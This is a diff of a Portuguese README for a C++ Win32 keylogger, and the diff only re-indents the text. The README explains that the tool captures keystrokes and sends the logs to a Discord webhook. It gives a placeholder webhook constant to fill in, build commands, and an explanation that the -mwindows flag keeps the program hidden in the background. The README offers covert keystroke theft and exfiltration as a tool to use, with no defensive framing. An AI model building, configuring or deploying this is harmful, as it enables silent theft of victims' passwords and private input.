@@ -15,21 +15,21 @@ O objetivo é capturar eventos de teclado e disparar os logs diretamente para um
 
 # 🛠️ Tecnologias e Dependências
 
-    Linguagem: C++
-
-    API Principal: Win32 API (Nativa do Windows)
-
-    Envio de Dados: Discord Webhook API
+      Linguagem: C++
+  
+      API Principal: Win32 API (Nativa do Windows)
+  
+      Envio de Dados: Discord Webhook API
 
 # ⚙️ Configuração Inicial
 
 Antes de compilar, você precisa configurar a sua URL do Webhook do Discord diretamente no código-fonte.
 
-    Abra o arquivo key.cpp.
-
-    Procure pela variável do Webhook (webHookDiscord).
-
-    Substitua pelo seu link gerado no Discord:
+        Abra o arquivo key.cpp.
+    
+        Procure pela variável do Webhook (webHookDiscord).
+    
+        Substitua pelo seu link gerado no Discord:
 
 const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";
 
@@ -37,29 +37,30 @@ const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";
 
 
 # 🚀 Compilação e Uso
-
-    Para buildar o projeto utilizando o g++ (MinGW), execute o comando abaixo no seu terminal. 
-    O parâmetro -mwindows garante que a aplicação rode em background sem abrir a janela do console.
-    Bash
+    
+        Para buildar o projeto utilizando o g++ (MinGW), execute o comando abaixo no seu terminal. 
+        O parâmetro -mwindows garante que a aplicação rode em background sem abrir a janela do console.
+        Bash
 
 ### g++ key.cpp -o KeyWin32 -mwindows
 
 ---
 
 # 🔧 Build em PowerShell
-    CMD or PowerShell
-
-    .\build.ps1
-
-    laucher.exe
+        CMD or PowerShell
+    
+        .\build.ps1
+    
+        laucher.exe
 
 ---
 
 # 📄 Como funciona o comando:
 
-      key.cpp: O seu código-fonte principal.
+        key.cpp: O seu código-fonte principal.
 
       -o KeyWin32: Define o nome do executável final.
 
       -mwindows: Oculta a janela de prompt de comando (execução invisível).
+      
 </div>
